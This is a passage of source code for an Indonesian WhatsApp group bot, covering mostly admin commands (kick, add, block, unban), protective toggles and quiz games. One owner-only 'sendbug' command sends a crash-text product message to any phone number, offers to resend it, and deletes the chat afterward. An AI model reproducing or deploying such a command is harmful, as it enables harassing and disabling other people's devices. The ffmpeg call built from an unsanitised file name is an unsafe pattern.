if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.revokeInvite(from)
await setReply('_Success_')
break

    
    
    case "antihidetag":
        if (!isGroup) return setReply("Khusus di grup");
        if (!isGroupAdmins) return sendSticker(hanyaadmin)
		if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
		if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          if (isAntihidetag) return setReply("Sudah aktif!!");
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan antihidetag!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
					
					
					
					
					case 'antivo':
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
					     if(isExtream) return
					if (!isGroup) return setReply('hanya bisa di group')
					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
          if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          
          if (isAntiviewonce) return setReply("Sudah aktif!!");
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan antiviewonce!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
           
          if (!isAntiviewonce) return setReply("Sudah mati!!");       
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI VIEW ONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antivo on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antivo off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
					
					
					
    

case 'kicktime':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply('Reply targetnya kak')
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
if (mentioned.length < 1) {
asu = dev.message.extendedTextMessage.contextInfo.participant
if(dev.message.extendedTextMessage === ownerNumber[0]) return setReply('Tidak bisa kick owner')
aw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   sendSticker1(aw)
                     }, 10000)
                   setTimeout( () => {
					xdev.sendMessage(from, 'Yok sama" Al-fatihah 😁', text)
					}, 8000)
					setTimeout( () => {
					setReply('Sukses kak 😆')
					}, 7000)
					setTimeout( () => {
					xdev.groupRemove(from, [asu])
					}, 6000)
					setTimeout( () => {
					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 5000)
					setTimeout( () => {
					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick 😋', text)
					}, 2500)
					setTimeout( () => {
					setReply('Perintah diterima kak 😃')
					}, 0)
					} else {
                   if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
                    if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
                    uw =fs.readFileSync('./sticker/bismilah.webp')
                   setTimeout( () => {
                   sendSticker1(uw)
                     }, 10000)
                   setTimeout( () => {
					xdev.sendMessage(from, 'Yok sama" Al-fatihah ??', text)
					}, 8000)
					setTimeout( () => {
					setReply('Sukses kak 😆')
					}, 7000)
					setTimeout( () => {
					 xdev.groupRemove(from, [mentioned[0]])
					}, 6000)
					setTimeout( () => {
					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
					}, 5000)
					setTimeout( () => {
					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick ??', text)
					}, 2500)
					setTimeout( () => {
					setReply('Perintah diterima kak 😃')
					}, 0)
                    }
                     break    
					
					
					
					
					
case 'kickme':
try{
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.groupRemove(from, [sender])
await setReply("Done wkwkw")
} catch (err){
setReply(`${err}`)
}
break
					


    
case 'kick':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer`)       
if (args[0] == '08') return setReply('Awali nomor dengan 62')  
if (args[0] == botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return setReply("Ga mau")
await setReply(`Asek asek jatah kick euy 😋`);
await xdev.groupRemove(from, [woke])
    
} else if (mentionByReply) {
if (!isGroup) return setReply("Hanya bisa di group")
Nomer =`${mentionByReply.split("@")[0]}@s.whatsapp.net`
if(Nomer === ownerNumber[0]) return setReply("Ga mau")
if(Nomer === botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
await setReply( `Modar kena kick awokawok 🤣`);
await xdev.groupRemove(from, [mentionByReply])
    
 } else if(mentionByTag.length == 1) { 
if (mentionByTag.length > 1) return setReply(`Satu satu dong`)
if (mentionByTag.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
if(mentionByTag[0].split("@")[0] + '@s.whatsapp.net' === botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
if (mentionByTag.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
await setReply(`Asek dapet jatah kick, Otw kick 😋`);
await xdev.groupRemove(from, [mentionByTag[0]])
} else{
setReply(`Kirim perintah ${prefix}kick @tag atau nomor atau reply pesan orang yang ingin di kick`)
}
break    


case 'add':
try{
					if (!isGroup) return setReply(mess.only.group)
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
			        if (!isBotGroupAdmins) return sendSticker(jadiinadmin)     
					if ( dev.message.extendedTextMessage === null) {
					if(!q) return setReply("Reply atau input nomer target")
                  	if (args[0] == '08') return setReply('Awali nomor dengan 62')
					  woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
											response = await xdev.groupAdd(from, [woke])
											o = response.participants[0]
											let inv = (Object.values(o))
											if(inv[0].code == 409) return setReply('Target Sudah Di Didalam Group!')
											if(inv[0].code == 403) return setReply('Eror, user private acc')
											if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
											if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
						await xdev.sendMessage(from,`Berhasil menambahkan ${q} ke dalam group ${groupName}`,text);          
						} else if (mentionByReply) {
if (!isGroup) return setReply("Hanya bisa di group")
													response = await xdev.groupAdd(from, [mentionByReply])
													o = response.participants[0]
													let inv = (Object.values(o))
													if(inv[0].code == 409) return setReply('Target Sudah Di Didalam Group!')
													if(inv[0].code == 403) return setReply('Gagal, Karena Di Private')
													if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
													if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
await xdev.sendMessage(from,`Berhasil menambahkan @${mentionByReply.split("@")[0]} ke dalam group ${groupName}`,text, {quoted: setQuoted});          
} else{
setReply("Reply atau input nomer target")
}
} catch (err){
console.log(err)
setReply("Terjadi Error, Tolong input nomer dengan benar")
}
break




case 'sendbug':
if (!isOwner) return onlyOwner()
{
reply("*Sending...*")
if (args[0] == '08') return setReply('Awali nomor dengan 62')
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
hmm4 = fs.readFileSync('./stik/fake.jpeg'),
imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
imeg = imeu.message.imageMessage
res = await xdev.prepareMessageFromContent(woke, {
'productMessage': {
'product': {
'productImage': imeg,
'productId': '',
'title': virtex8(prefix),
'description': virtex8(prefix),
'priceAmount1000': '1000',
'descriptionCount': 1,
'productImageCount': '1'
},
'businessOwnerJid': `0@s.whatsapp.net`,
'contextInfo': forward
}
}, {
contextInfo: forward
}), 
await xdev.relayWAMessage(res)
teks =`Sukses sendbug ke nomer ${woke.split("@")[0]}`

let aklo = [
{"buttonId": `${prefix}sendbug ${q} `,"buttonText": {"displayText": `sᴇɴᴅ ʟᴀɢɪ`},"type": "RESPONSE"},
{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}
]
await sendButMessage(from, teks, copyright, aklo)
await xdev.modifyChat(woke, ChatModification.delete)
console.log("Sukses sendbug")
}
break;





case 'block':
	if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return setReply("Ga mau")
await xdev.blockUser(woke, "add")
await addBlock(woke, blocked)
await setReply( `Sukses block ${woke.split("@")[0]}`);
    
} else if (dev.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
asu = dev.message.extendedTextMessage.contextInfo.participant
Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
if(Nomer === ownerNumber[0]) return setReply("Ga mau")
await xdev.blockUser(Nomer, "add")
await addBlock(Nomer, blocked)
await setReply( `Berhasil block ${Nomer.split("@")[0]}`);
    
 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
await xdev.blockUser(ahah, "add")
await addBlock(ahah, blocked)
await setReply(`${ahah.split("@")[0]} berhasil di block`);
   } else{
 setReply(`Kirim perintah ${prefix}block @tag atau nomor atau reply pesan orang yang ingin di block`)
 }
break    


case 'unblock':
	if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
await xdev.blockUser(woke, "remove")
await unBlock(woke, blocked)
await setReply( `Sukses unblock ${woke.split("@")[0]}`);
    
} else if (dev.message.extendedTextMessage.contextInfo.participant) {
if (!isGroup) return setReply("Hanya bisa di group")
asu = dev.message.extendedTextMessage.contextInfo.participant
Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
await xdev.blockUser(Nomer, "remove")
await unBlock(Nomer, blocked)
await setReply( `Berhasil unblock ${Nomer.split("@")[0]}`);
    
 } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) return setReply(`Satu satu dong`)
ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
await xdev.blockUser(ahah, "remove")
await unBlock(ahah, blocked)
await setReply(`${ahah.split("@")[0]} berhasil di unblock`);
   } else{
 setReply(`Kirim perintah ${prefix}unblock @tag atau nomor atau reply pesan orang yang ingin di block`)
 }
break    


case 'unbanned':
			case 'unban': //PERCOBAA
		    if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) {
			
if (q.startsWith('08')){
return setReply('Awali nomor dengan 62') 
} else  if (q.startsWith('62')){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
} else {
 return setReply("Masukan nomer")
}

		    if(!cekBannedUser (woke, ban)) return setReply("Udah di unban")
            unBanned (woke, ban)             
            setReply( `*Sukses Unban ${woke}`);
            } else if (isGroup && mentionByReply) {
            asu = dev.message.extendedTextMessage.contextInfo.participant           
            if(!cekBannedUser (asu, ban)) return setReply("Udah di unban")
            unBanned (asu, ban)             
            setReply( `*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${asu.split("@")[0]}`);
            } else if(isGroup && mentionByTag){
       	 if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
            if (mentionByTag.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
            if (mentionByTag.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)    
            lala = `${mentionByTag[0].split('@')[0]}@s.whatsapp.net`
            if(!cekBannedUser (lala, ban)) return setReply("Udah di unban")        
            unBanned(lala, ban) 
            setReply(`*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${mentioned[0].split('@')[0]}`);
            } else {
            setReply("Noob")
            }
            break    
         

    
    case 'setwelcome':
    if ((args[0]) === 'type1' ) {
    if(xdev.welcome === "type1") return setReply("Udah aktif")
    xdev.welcome = "type1"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if ((args[0]) === 'type2' ) {
    if(xdev.welcome === "type2") return setReply("Udah aktif")
    xdev.welcome = "type2"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if ((args[0]) === 'type3' ) {
   if(xdev.welcome === "type3") return setReply("Udah aktif")
    xdev.welcome = "type3"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if ((args[0]) === 'type4' ) {
   if(xdev.welcome === "type4") return setReply("Udah aktif")
    xdev.welcome = "type4"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if(!q){
    setReply("Pilih setwelcome : type1 atau type2 atau type3")
    } else {
    setReply("Query tidak di temukan")
    }
    break
    
    
   
    
    
    case 'welcome':
    if (!isGroupAdmins) return sendSticker(hanyaadmin)
                    if(isExtream) return
					if (!isGroup) return setReply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isWelkom) return setReply('Fitur welcome sudah aktif kak')
						welkom.push(from)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah aktif`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isWelkom) return setReply('Udah mati')
						welkom.splice(from, 1)
						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
						let ih =`Fitur welcome telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE WELCOME`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}welcome on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}welcome off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;                 


                 
                 case 'antidel':
                 case 'antidelete':
    if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
                    if(isExtream) return
					if (!isGroup) return setReply('hanya bisa di group')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntidel) return setReply('Sudah aktif kak')
						xdev.antidel.push(from)
						let ih =`Fitur anti delete telah aktif`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntidel) return setReply('Udah mati')
						xdev.antidel.splice(from, 1)
						let ih =`Fitur anti delete telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI DELETE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antidel on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antidel off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
      case 'antilinkgc':
      if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (!isGroup) return setReply('hanya bisa di group')
					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
						addDataId(from, command, DataId)
						let ih =`Fitur antilink group telah di aktifkan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntilinkGc) return setReply('Udah mati')
						removeDataId (command, from, DataId)
						let ih =`Fitur antilink group telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
    
    
    
    
 
    

       
       
         




					
					
					case "antivirtex":
	    if(isExtream) return
		if (!isGroupAdmins) return sendSticker(hanyaadmin)
        if (!isGroup) return setReply('Kusus group')
        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
        if (AntiVirtex) return setReply('Sudah Aktif')
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan antivirtex!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
        if (!AntiVirtex) return setReply('Sudah Mati')
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        
        


  
  	
        
        
        
        
        
        case "antiasing":
      if (!isGroup) return setReply('Kusus group')
if (!isGroupAdmins) return sendSticker(hanyaadmin)
			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
			if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          if (isKickarea) return setReply("Sudah aktif!!");
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan kickarea!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
    	 if (!isKickarea) return setReply("Udah off!!");
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
					
					
					
					
					
					



    
    
    
    
    case 'getppgc':
					if (!isGroup) return 
					setReply(mess.wait)
					ahenak = from
		if (`${ahenak}@g.us`) {
		try {
					ppimg = await xdev.getProfilePicture(ahenak)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await xdev.groupMetadata(ahenak)
				uh = await xdev.getProfilePicture(ahenak)
				buffer = await getBuffer(uh)
				xdev.sendMessage(from, buffer, image, {quoted: dev})
		} 
  break
  
  
									
									
									
									case 'sewacheck': case 'ceksewa':  case 'sewacek':
									if (!isGroup) return setReply(mess.only.group)
									if (!_sewa.checkSewaGroup(from, sewa)) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
									let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
									let sewenye = `「 *SEWA EXPIRE* 」
*Group*: ${groupName}
*ID*: ${from}
*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
									setReply(sewenye)
									break
									
    
    
             
    
    
    
    case 'infogc':
           case 'infogrup':
            case 'infogroup':
            case 'grupinfo':
            case 'groupinfo':
                if (!isGroup) return setReply('Hanya bisa di dalam group')
                 
                try {
                    var pic = await xdev.getProfilePicture(from)
                } catch {
                    var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                }
                
                let ingfo = `
*G R O U P I N F O*
*Name :* ${groupName}
*ID Grup :* ${from}
*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}
*Jumlah Admin :* ${groupAdmins.length}
*Jumlah Peserta :* ${groupMembers.length}
*AntiLink :* ${isAntiLink ? 'ON' : 'OFF'}
*AntiViewOnce :* ${isAntiviewonce ? 'ON' : 'OFF'}
*AntiBadword :* ${Toxic ? 'ON' : 'OFF'}
*Antiasing :* ${isKickarea ? 'ON' : 'OFF'}
*Antivirtex :* ${AntiVirtex ? 'ON' : 'OFF'}
*Desc :* \n${groupMetadata.desc}`
                xdev.sendMessage(from, ingfo, text, {
                    'contextInfo': {  
                        'text': '🔥',
                        'forwardingScore': 10000000,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title':`${groupName}`,
                            'body': '',
                            'previewType': 'PHOTO',
                           
                            'thumbnail': await getBuffer(pic),
                            'sourceUrl': ''
                        }
                    }
             })
                break
           
                            
                          
           case 'getidgc':
           if(!isGroup) return setReply("Hanya bisa di group")
           setReply(`${from}`)
           break
    
    
    
       //------------------< Enable / Disable >-------------------
            case 'antibadword':
            case 'antitoxic':
                 if(isExtream) return
                if (!isGroup) return setReply('Hanya bisa di group')
                if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
                    if (Toxic) return setReply(`Udah aktif`)
                    addDataId(from, command, DataId)
					setReply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
                    removeDataId (command, from, DataId)
                    setReply('antibadword grup nonaktif')
                } else if (!q) {
                      sendButMessage(from, `MODE ANTI BADWORD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibadword on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antibadword off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
    
    
    
    
    
    
    
    
    
    
    case 'setppgrup': 
    case 'setppgc':
									if (!isGroup) return setReply(mess.only.group)
									if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin)
									if (!isBotGroupAdmins) return setReply(`Jadikan Bot Sebagai Admin Group!`)
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
										let media = await xdev.downloadMediaMessage(encmedia)
										xdev.updateProfilePicture(from, media)
										
										} else if (isQuotedSticker){
											if (dev.message.videoMessage) return setReply('Error Bro Wkwkwk')
											encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
											media = await xdev.downloadAndSaveMediaMessage(encmedia)
											ran = getRandom('.png')
											exec(`ffmpeg -i ${media} ${ran}`, (err) => {
												fs.unlinkSync(media)
												if (err) return setReply('Eror Lord')
												buffer = fs.readFileSync(ran)
												xdev.updateProfilePicture(from, buffer)
												fs.unlinkSync(ran)
												})
											} else {
												setReply(`Kirim atau tag gambar dengan caption ${prefix + command}`)
											}
									break
    
    
    
    

    
    
    case 'caklontong': case 'ckl':{
                    if (!isGroup) return setReply(mess.only.group)
                    if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                    if (game.isCkl(from, caklontong)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/caklontong.js');
				    jsonData = JSON.parse(data);
				    randIndex = Math.floor(Math.random() * jsonData.length);
				    randKey = jsonData[randIndex];
                    const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    setReply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : ${randKey.result.soal}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                    let ikasayank = randKey.result.jawaban.toLowerCase()
                    deskripsi = randKey.result.desc
                    caklontong1.push(deskripsi)
                    game.addckl(from, ikasayank, gamewaktu, caklontong)
                    gameAdd(senderNumber, user)
                     }
                    break
    
    
    
    
    case 'family100':{
                      if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                      if (!isGroup) return setReply(mess.only.group)
                      if (game.isfam(from, family100)) return setReply(`Masih ada soal yang belum di selesaikan`)
                      data = fs.readFileSync('./lib/game/family100.js');
				      fami = JSON.parse(data);
				      ly100 = Math.floor(Math.random() * fami.length);
				      randKey = fami[ly100];
				      Pertanyaan = randKey.result.soal
                      setReply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${Pertanyaan}\n*Total Jawaban :* ${randKey.result.jawaban.length }\n\nWaktu : ${gamewaktu} detik`)
                      let anoh = randKey.result.jawaban
                      let rgfds = []
                      for (let i of anoh){
                      let fefs = i.split('/') ? i.split('/')[0] : i
                      let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
                      let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
                      rgfds.push(axsf.toLowerCase())
                        }
                       game.addfam(from, rgfds, gamewaktu, family100)
                       gameAdd(senderNumber, user)
                         }
                         break
    
    
    

           case 'tebakbendera': case 'tb':{
                     if (!isGroup) return setReply(mess.only.group)
                     if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                     if (game.isTebakBendera(from, tebakbendera)) return setReply(`Masih ada soal yang belum di selesaikan`)
                    data = fs.readFileSync('./lib/game/tebakbendera.js');
				    jsonData = JSON.parse(data);
				    randIndex = Math.floor(Math.random() * jsonData.length);
				    randKey = jsonData[randIndex];
                    const petunjuk = randKey.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                    setReply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : Bendera negara manakah itu ${randKey.bendera}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
                    let ikasayank = randKey.jawaban.toLowerCase()
                    game.addbendera(from, ikasayank, gamewaktu, tebakbendera)
                    gameAdd(senderNumber, user)
                     }
                    break
          
           
           
           case 'tebakgambar':{
                  if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                  if (!isGroup) return setReply(mess.only.group)
                  setReply(mess.wait)
                  if (game.isTebakGambar(from, tebakgambar)) return setReply(`Masih ada soal yang belum di selesaikan`)
                 data = fs.readFileSync('./lib/game/tebakgambar.js');
				  jsonData = JSON.parse(data);
				  randIndex = Math.floor(Math.random() * jsonData.length);
				  randKey = jsonData[randIndex];
                  const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
                  sendMediaURL(from, randKey.result.soalImg,`Silahkan jawab soal berikut ini\n\nPetunjuk : ${petunjuk}\nWaktu : ${gamewaktu} detik`, dev)
                  let anih = randKey.result.jawaban.toLowerCase()
                  game.addgambar(from, anih, gamewaktu, tebakgambar)
                  gameAdd(senderNumber, user)
	               }
                   break  	 
           
           
           case 'tebaklirik': case 'tl':{
                      if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                      if (!isGroup) return setReply(mess.only.group)
                      if (game.isTebakLirik(from, tebaklirik)) return setReply(`Masih ada soal yang belum di selesaikan`)
                     data = fs.readFileSync('./lib/game/tebaklirik.js');
				      jsonData = JSON.parse(data);
				      randIndex = Math.floor(Math.random() * jsonData.length);
				      randKey = jsonData[randIndex];      
